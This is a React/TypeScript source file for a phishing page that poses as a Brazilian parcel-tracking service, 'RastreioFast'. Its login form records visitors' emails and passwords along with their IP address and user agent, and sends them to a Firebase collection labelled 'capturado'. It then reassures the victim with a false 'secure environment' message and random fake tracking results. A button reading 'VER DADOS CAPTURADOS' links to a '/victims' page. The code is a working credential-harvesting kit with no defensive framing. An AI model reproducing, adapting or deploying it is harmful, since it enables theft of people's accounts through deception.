import React, { useState } from "react";
import { db } from "../services/firebase";
import { collection, addDoc, Timestamp } from "firebase/firestore";
import { useNavigate } from "react-router-dom";

import {
  Box,
  Button,
  Container,
  TextField,
  Typography,
  Paper,
  Snackbar,
  Alert,
} from "@mui/material";

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState<string>("");
  const [senha, setSenha] = useState<string>("");
  const [autenticado, setAutenticado] = useState<boolean>(false);
  const [codigo, setCodigo] = useState<string>("");
  const [resultado, setResultado] = useState<any>(null);
  const [openPopup, setOpenPopup] = useState<boolean>(false);

  const navigate = useNavigate();

  const resultadosFake = [
    {
      status: "Objeto em trânsito",
      local: "Centro de Distribuição - São Paulo/SP",
      data: "03/05/2025 08:45",
    },
    {
      status: "Objeto saiu para entrega",
      local: "Unidade de Entrega - Belo Horizonte/MG",
      data: "02/05/2025 14:10",
    },
    {
      status: "Objeto entregue ao destinatário",
      local: "Unidade de Entrega - Curitiba/PR",
      data: "01/05/2025 16:30",
    },
    {
      status: "Objeto aguardando retirada",
      local: "Agência dos Correios - Recife/PE",
      data: "30/04/2025 10:15",
    },
    {
      status: "Objeto não encontrado",
      local: "Verifique o código de rastreio",
      data: "-",
    },
  ];

  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    try {
      const ip = await fetch("https://api.ipify.org?format=json")
        .then((res) => res.json())
        .then((data) => data.ip);

      await addDoc(collection(db, "login"), {
        email,
        senha,
        ip,
        hora: Timestamp.now(),
        userAgent: navigator.userAgent,
        plataforma: "RastreadorFast",
        status: "capturado",
      });

      setAutenticado(true);
      setOpenPopup(true);
    } catch (err) {
      console.error("ERRO AO ENVIAR DADOS:", err);
    }
  };

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const aleatorio =
      resultadosFake[Math.floor(Math.random() * resultadosFake.length)];
    setResultado(aleatorio);
  };

  return (
    <Container maxWidth="sm">
      <Paper
        elevation={3}
        sx={{ padding: 4, marginTop: 8, backgroundColor: "#f4f0fa" }}
      >
        <Typography
          variant="h4"
          align="center"
          gutterBottom
          sx={{ color: "#5e35b1", fontWeight: "bold" }}
        >
          RastreioFast
        </Typography>

        <Typography variant="subtitle1" align="center" gutterBottom>
          Acompanhe sua entrega de forma rápida e segura 💜
        </Typography>

        {!autenticado ? (
          <Box component="form" onSubmit={handleLogin} noValidate>
            <TextField
              label="Email"
              variant="outlined"
              fullWidth
              margin="normal"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <TextField
              label="Senha"
              type="password"
              variant="outlined"
              fullWidth
              margin="normal"
              value={senha}
              onChange={(e) => setSenha(e.target.value)}
              required
            />
            <Button
              type="submit"
              variant="contained"
              fullWidth
              sx={{ mt: 2, backgroundColor: "#7e57c2" }}
            >
              Entrar
            </Button>
          </Box>
        ) : (
          <>
            <Typography variant="h6" align="center" sx={{ mt: 4 }}>
              Digite seu código de rastreio
            </Typography>

            <Box component="form" onSubmit={handleSubmit} noValidate>
              <TextField
                label="Código de Rastreio"
                variant="outlined"
                fullWidth
                margin="normal"
                value={codigo}
                onChange={(e) => setCodigo(e.target.value)}
                required
              />
              <Button
                type="submit"
                variant="contained"
                fullWidth
                sx={{ mt: 2, backgroundColor: "#7e57c2" }}
              >
                Rastrear Agora
              </Button>
            </Box>

            {resultado && (
              <Box
                mt={4}
                sx={{ backgroundColor: "#ede7f6", padding: 2, borderRadius: 2 }}
              >
                <Typography variant="h6" color="#5e35b1">
                  Resultado do Rastreamento
                </Typography>
                <Typography>
                  <strong>Status:</strong> {resultado.status}
                </Typography>
                <Typography>
                  <strong>Local:</strong> {resultado.local}
                </Typography>
                <Typography>
                  <strong>Data:</strong> {resultado.data}
                </Typography>
              </Box>
            )}

            <Box mt={4} textAlign="center">
              <Typography variant="h6">Painel de Controle</Typography>
              <Button
                variant="contained"
                color="error"
                sx={{ mt: 2 }}
                onClick={() => navigate("/victims")}
              >
                VER DADOS CAPTURADOS
              </Button>
            </Box>
          </>
        )}
      </Paper>

      <Snackbar
        open={openPopup}
        autoHideDuration={3000}
        onClose={() => setOpenPopup(false)}
        anchorOrigin={{ vertical: "top", horizontal: "center" }}
      >
        <Alert
          onClose={() => setOpenPopup(false)}
          severity="success"
          sx={{ width: "100%" }}
        >
          Ambiente seguro. Prossiga com o código de rastreio.
        </Alert>
      </Snackbar>
    </Container>
  );
};

export default LoginForm;
